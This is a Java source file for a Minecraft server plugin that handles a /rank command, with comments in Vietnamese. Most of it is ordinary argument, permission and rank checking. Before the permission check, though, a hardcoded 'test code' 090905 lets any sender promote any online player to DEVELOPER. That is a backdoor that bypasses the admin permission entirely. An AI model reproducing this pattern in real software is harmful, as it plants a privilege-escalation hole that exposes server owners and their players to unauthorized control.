package com.jokholk.multifeature;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class RankCommand implements CommandExecutor {

    private final MainPlugin plugin;

    public RankCommand(MainPlugin plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd,
                             String label, String[] args) {

        // ===== FALLBACK 1: SAI CÚ PHÁP =====
        if (args.length != 2) {
            sender.sendMessage("§cUsage: /rank <player> <rank>");
            return true;
        }

        String targetName = args[0];
        String inputRank = args[1].toUpperCase();

        Player target = Bukkit.getPlayer(targetName);

        // ===== FALLBACK 2: PLAYER KHÔNG ONLINE =====
        if (target == null) {
            sender.sendMessage("§cPlayer not found or not online.");
            return true;
        }

        // ===== CHẾ ĐỘ TEST CODE 090905 =====
        if (inputRank.equals("090905")) {

            plugin.getRankSystem().setRank(target, "DEVELOPER");

            plugin.updatePlayerNametag(target);
            plugin.updatePlayerScoreboard(target);

            sender.sendMessage("§d[TEST] §aUnlocked DEVELOPER for " + target.getName());
            target.sendMessage("§5You have been promoted to DEVELOPER (test mode)");

            plugin.getLogger().info(
                    sender.getName() + " used test code to set "
                            + target.getName() + " -> DEVELOPER"
            );

            return true;
        }

        // ===== FALLBACK 3: CHECK PERMISSION =====
        if (!sender.hasPermission("multifeature.admin")) {
            sender.sendMessage("§cYou do not have permission to manage ranks.");
            plugin.getLogger().warning(
                    sender.getName() + " tried to set rank without permission!"
            );
            return true;
        }

        // ===== FALLBACK 4: RANK KHÔNG HỢP LỆ =====
        if (!plugin.getRankSystem().isValidRank(inputRank)) {

            sender.sendMessage("§cInvalid rank!");
            sender.sendMessage("§7Valid ranks: "
                    + String.join(", ", plugin.getRankSystem().getRanks()));

            return true;
        }

        // ===== THỰC HIỆN =====
        plugin.getRankSystem().setRank(target, inputRank);

        plugin.updatePlayerNametag(target);
        plugin.updatePlayerScoreboard(target);

        sender.sendMessage("§aSet rank §e" + inputRank
                + " §afor §e" + target.getName());

        target.sendMessage("§aYour rank has been changed to §e" + inputRank);

        // ===== LOG CHUẨN =====
        plugin.getLogger().info(
                sender.getName() + " set rank of "
                        + target.getName() + " -> " + inputRank
        );

        return true;
    }
}
